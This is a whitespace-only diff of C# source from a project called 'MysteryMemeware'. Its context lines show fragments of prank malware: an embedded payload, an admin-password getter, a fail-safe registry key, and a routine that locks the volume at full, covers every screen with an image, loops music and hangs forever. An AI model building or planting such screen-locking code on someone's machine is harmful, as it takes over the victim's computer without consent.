@@ -7,7 +7,6 @@ using System.Reflection;
 using System.Diagnostics;
 using System.Threading;
 using System.Windows.Forms;
-
 namespace MysteryMemeware
 {
     public static class OldProgram
@@ -28,9 +27,7 @@ namespace MysteryMemeware
         public const string BackgroundSongResourceName = "MysteryMemeware.Payload.Assets.BackgroundSong.wav";
         public const string CoverImageResourceName = "MysteryMemeware.Payload.Assets.CoverImage.bmp";
         public const string CoverImageWithFailSafeResourceName = "MysteryMemeware.Payload.Assets.CoverImageWithFailSafe.bmp";
-
         public const string AllowFailSafeRegistryPath = "Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\MysteryMemeware\\AllowFailSafe";
-
         public static readonly string AdminPassword = GetAdminPassword();
         private static string GetAdminPassword()
         {
@@ -99,7 +96,6 @@ namespace MysteryMemeware
             }
             catch
             {
-
             }
         }
         public static void Run()
@@ -110,7 +106,6 @@ namespace MysteryMemeware
             }
             catch
             {
-
             }
             try
             {
@@ -131,7 +126,6 @@ namespace MysteryMemeware
                 }
                 catch
                 {
-
                 }
                 try
                 {
@@ -145,22 +139,18 @@ namespace MysteryMemeware
                         }
                         catch
                         {
-
                         }
                     }
                 }
                 catch
                 {
-
                 }
             }
             catch
             {
-
             }
             while (true)
             {
-
             }
         }
         [STAThread]
@@ -314,12 +304,9 @@ namespace MysteryMemeware
         public static void Run()
         {
             VolumeHelper.LockAtFull();
-
             ScreenCoverForm.CoverAllScreens(Image.FromStream(typeof(Program).Assembly.GetManifestResourceStream(DisplayCoverImageResourceName)), System.Drawing.Drawing2D.InterpolationMode.NearestNeighbor);
-
             SoundPlayer soundPlayer = new SoundPlayer(typeof(Program).Assembly.GetManifestResourceStream(MemeMusicResourceName));
             soundPlayer.PlayLooping();
-
             while (true)
             {
                 Thread.Sleep(int.MaxValue);
